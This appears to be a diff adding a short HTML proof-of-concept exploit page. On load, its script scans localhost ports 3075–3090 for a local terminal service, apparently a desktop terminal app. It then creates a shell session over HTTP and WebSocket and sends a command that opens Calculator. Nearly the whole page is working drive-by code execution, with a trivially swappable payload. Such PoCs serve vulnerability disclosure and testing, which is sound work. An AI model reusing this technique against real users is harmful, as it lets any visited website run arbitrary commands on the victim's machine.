@@ -1,0 +1,59 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>Orz</title>
+    <script type="application/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
+</head>
+
+<body>
+
+    <script type="application/javascript">
+        function exec_cmd(port) {
+            var session_id = 'DemoDemo';
+            var opt = {
+                'cols': 100,
+                'rows': 100,
+                'term': 'xterm-256color',
+                'saveTerminalLogToFile': false,
+                'id': 'DemoDemo',
+                'status': 'processing',
+                'title': 'Demo',
+                'keepaliveInterval': 10000,
+                'keepaliveCountMax': 10,
+                'execWindows': 'System32/WindowsPowerShell/v1.0/powershell.exe',
+                'execMac': 'bash',
+                'execLinux': 'bash',
+                'sessionId': session_id,
+                'tabId': 'DemoDemo',
+                'terminalIndex': 0,
+                'readyTimeout': 50000,
+                'proxy': {},
+                'type': 'local'
+            };
+            $.ajax({
+                type: 'post',
+                url: 'http://localhost:' + port.toString() + '/terminals',
+                contentType: 'application/json',
+                data: JSON.stringify(opt),
+                success: function (result) {
+                    var ws = new WebSocket('ws://localhost:' + port.toString() + '/terminals/' + result + '?sessionId=' + session_id);
+                    ws.onopen = function (event) {
+                        ws.send('open /System/Applications/Calculator.app\r\n');
+                    };
+                },
+                error: function (result) {
+                    exec_cmd(port + 1);
+                    if (port > 3090) {
+                        return false;
+                    }
+                }
+            });
+        }
+        exec_cmd(3075);
+    </script>
+
+</body>
+</html>
